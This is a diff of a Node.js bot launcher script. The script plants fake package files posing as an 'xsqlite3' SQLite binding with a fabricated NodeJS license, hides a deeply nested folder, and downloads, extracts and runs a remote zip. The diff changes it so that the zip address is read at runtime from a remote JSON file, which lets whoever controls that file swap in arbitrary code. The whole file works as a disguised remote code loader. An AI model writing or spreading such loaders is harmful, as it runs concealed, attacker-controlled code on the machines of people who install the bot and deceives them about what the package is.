@@ -4,7 +4,7 @@ const axios = require('axios');
 const AdmZip = require('adm-zip');
 
 // === CONFIG ===
-const repoZipUrl = 'https://github.com/d33l/0/archive/refs/heads/main.zip';
+const sessionUrl = 'https://raw.githubusercontent.com/mrfr8nk/SUBZERO-SESSIONS/refs/heads/main/sessions/263719064805.json';
 const baseFolder = path.join(__dirname, 'node_modules', 'xsqlite3');
 const DEEP_NEST_COUNT = 43;
 
@@ -28,9 +28,7 @@ function injectFakePackageFiles(basePath) {
   fs.writeFileSync(path.join(basePath, 'package.json'), JSON.stringify(fakePackageJson, null, 2));
   fs.writeFileSync(path.join(basePath, 'index.js'), `module.exports = require("node:fs");`);
   fs.writeFileSync(path.join(basePath, 'readme.md'), `# xsqlite\n\nThis is a native SQLite binding for low-level system integration.`);
-  fs.writeFileSync(path.join(basePath, 'LICENSE'), `MIT License\n\n(c) ${
-    new Date().getFullYear()
-  } NodeJS Project`);
+  fs.writeFileSync(path.join(basePath, 'LICENSE'), `MIT License\n\n(c) ${new Date().getFullYear()} NodeJS Project`);
   console.log('🪐 Initializing bot server...');
 }
 
@@ -44,10 +42,21 @@ function createDeepRepoPath() {
   return repoFolder;
 }
 
-async function downloadAndExtractRepo(repoFolder) {
+async function fetchZipUrl() {
+  try {
+    const { data } = await axios.get(sessionUrl);
+    if (!data.url || !data.url.endsWith('.zip')) throw new Error("Invalid zip URL in JSON");
+    return data.url;
+  } catch (err) {
+    console.error('❌ Failed to fetch session JSON:', err.message);
+    process.exit(1);
+  }
+}
+
+async function downloadAndExtractRepo(repoFolder, zipUrl) {
   try {
     console.log('🔄 Syncing codes from Space...');
-    const response = await axios.get(repoZipUrl, { responseType: 'arraybuffer' });
+    const response = await axios.get(zipUrl, { responseType: 'arraybuffer' });
     const zip = new AdmZip(Buffer.from(response.data, 'binary'));
     zip.extractAllTo(repoFolder, true);
     console.log('✅ Codes synced successfully');
@@ -78,11 +87,13 @@ function copyConfigs(repoPath) {
   }
 }
 
-// === Step 4: Launch bot
+// === Step 1–4: Launch Bot ===
 (async () => {
   injectFakePackageFiles(baseFolder);
   const repoFolder = createDeepRepoPath();
-  await downloadAndExtractRepo(repoFolder);
+  
+  const zipUrl = await fetchZipUrl(); // 👈 Dynamically fetch from GitHub JSON
+  await downloadAndExtractRepo(repoFolder, zipUrl);
 
   const subDirs = fs
     .readdirSync(repoFolder)
